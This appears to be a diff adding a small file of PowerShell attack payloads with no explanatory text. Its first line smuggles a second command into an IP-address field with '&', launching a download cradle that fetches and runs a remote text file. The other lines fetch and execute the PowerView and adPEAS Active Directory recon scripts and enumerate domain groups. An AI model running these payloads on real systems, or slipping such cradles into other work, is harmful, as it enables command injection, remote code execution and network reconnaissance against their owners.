@@ -1,0 +1,6 @@
+8.8.8.8& powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jhonjairo-coder/CPAD/main/actualizaciones.txt')"
+
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1');
+
+
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1'); net group /domain
